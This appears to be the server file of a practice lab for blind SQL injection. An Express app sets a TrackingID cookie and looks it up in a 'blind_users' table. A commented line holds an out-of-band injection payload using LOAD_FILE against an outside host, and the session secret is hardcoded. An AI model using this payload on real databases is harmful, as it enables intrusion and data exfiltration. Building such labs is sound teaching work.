const axios = require('axios')
const express = require('express')
const app = express()
const bodyparser = require('body-parser')
const cookieparser = require('cookie-parser')
const session = require('express-session')
const csrf = require('csurf')
const db = require('./db')
const msdb = require('./db/msdb.js')
const util = require('util')


const port = 9000

// nacin kako handelat sql errore
async function test() {
    var f_err = false
    try {
        var res = await db.test_error()
    }
    catch(e) {
        console.log(e)
        f_err = true
    }
    if (!f_err) {
        console.log(res)
    }
}

//test()
//SELECT user_id FROM mydb.blind_users WHERE TrackingID = '0y5hn19oy15d066f' UNION SELECT LOAD_FILE(CONCAT('\\\\oob.arrdub.net'))#

//TO-DO dodaj metodu koja ce novi cookie dodati u bazu
        //await db.add_blind_user(value)

//   /^(\/.+|(?!\/).*)$/

//user_id = await db.get_blind_user(req.cookies.TrackingID)
//if(user_id[0][0]) {
    //console.log(user_id, 66)

app.use(bodyparser.json())
app.use(bodyparser.urlencoded({ extended: true }))
app.use(cookieparser())
app.use(session({secret: 'mycsrftokensecret', resave: false, saveUninitialized: false, name: 'session', rolling: true, cookie: {maxAge: 8640000}}))
app.use(csrf())
app.all('/', async (req, res, next) => {
    if(!req.cookies.TrackingID) {
        var value = ''
        value += Math.random().toString(36).replace(/[^a-z0-9]+/g, '')
        value += Math.random().toString(36).replace(/[^a-z0-9]+/g, '').slice(0,4)
        
        await msdb.add_blind_user(value)

        res.cookie('TrackingID', value, {httpOnly: true, maxAge: 8640000})
    }
    next()
})
// all path except for root ('/')
app.use(/^(\/.+|(?!\/).*)$/, async (req, res, next) => {
    console.log(util.format("%s", req.cookies.TrackingID))
    if(!req.cookies.TrackingID) {
        var err = new Error("No cookie!")
        next(err)
    }
    else {
        user_id = await msdb.get_blind_user(req.cookies.TrackingID)
        console.log(user_id)
        console.log(user_id[0].recordset[0].user_id, 60)
        if(user_id[0].recordset[0].user_id === undefined) {
            var err = new Error("Incorect cookie!")
            next(err)
        }
        else {
            console.log(user_id[1], 71)
            next()
        }
    }
})
app.use((req, res, next) => {
    app.locals._token = req.csrfToken()
    next()
})

app.use('/', require('./routes/router'))

app.set('view engine', 'ejs')

app.listen(port, ()=> {
    console.log(`Server listeing on  ${port}`)
    })